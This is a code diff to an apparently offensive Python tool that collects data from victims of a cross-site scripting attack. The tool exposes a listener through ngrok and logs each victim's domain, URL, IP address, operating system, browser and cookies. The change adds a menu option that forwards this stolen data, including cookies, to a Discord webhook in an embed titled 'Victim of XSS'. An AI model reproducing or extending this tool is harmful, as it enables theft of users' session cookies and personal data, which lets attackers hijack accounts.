@@ -10,6 +10,13 @@ import re
 os.system("ngrok config add-authtoken (Your Ngrok Token)  || ./ngrok config add-authtoken (Your Ngrok Token) ")
 init()
 
+print(f"""
+{Fore.YELLOW}[1]{Fore.RED} I just want to see it on the Console screen{Fore.RESET}
+{Fore.YELLOW}[2]{Fore.RED} I want to use Discord Webhook as an extra{Fore.RESET}
+""")
+select = int(input('Of course I choose this: '))
+os.system("cls || clear")
+
 # id, token type
 wh = Webhook(id="(Your Webhook Id)", token="(Your Webhook Token)")
 
@@ -73,33 +80,35 @@ def home():
     print(f"{Fore.BLUE}Browser: {ua.browser.family} {ua.browser.version_string}{Fore.RESET}")
     print(f"{Fore.YELLOW}Cookies:\n{CookiesTextConsole}{Fore.RESET}")
 
-    def remove_ansi_codes(text):
-        ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
-        return ansi_escape.sub('', text)
+    if select == 2:
+        def remove_ansi_codes(text):
+            ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
+            return ansi_escape.sub('', text)
 
-    try:
-        wh.send_embed(
-            title="Victim of XSS",
-            description="Information from the payload.",
-            color=0xFFFFFF,
-            fields=[
-                ("Domain", hostvalue),
-                ("URL", visited_url),
-                ("User Ip", ip),
-                ("Date", current_time),
-                ("Operating System", f"{ua.os.family} {ua.os.version_string}"),
-                ("Device", f"{ua.device.family} ({device_type})"),
-                ("Browser", f"{ua.browser.family} {ua.browser.version_string}"),
-                ("Cookies", remove_ansi_codes(CookiesText))
-            ],
-            footer="-Flagway"
-        )
+        try:
+            wh.send_embed(
+                title="Victim of XSS",
+                description="Information from the payload.",
+                color=0xFFFFFF,
+                fields=[
+                    ("Domain", hostvalue),
+                    ("URL", visited_url),
+                    ("User Ip", ip),
+                    ("Date", current_time),
+                    ("Operating System", f"{ua.os.family} {ua.os.version_string}"),
+                    ("Device", f"{ua.device.family} ({device_type})"),
+                    ("Browser", f"{ua.browser.family} {ua.browser.version_string}"),
+                    ("Cookies", remove_ansi_codes(CookiesText))
+                ],
+                footer="-Flagway"
+            )
 
-        print(f"{Fore.GREEN}A message has been sent to webhook.")
+            print(f"{Fore.GREEN}A message has been sent to webhook.")
 
-    except Exception as e:
-        wh.send_message("Error:", e)
-        print("Hata:", e)
+        except Exception as e:
+            wh.send_message("Error:", e)
+            print("Hata:", e)
+
 
 
     js_payload = f'{ngrok_url}'
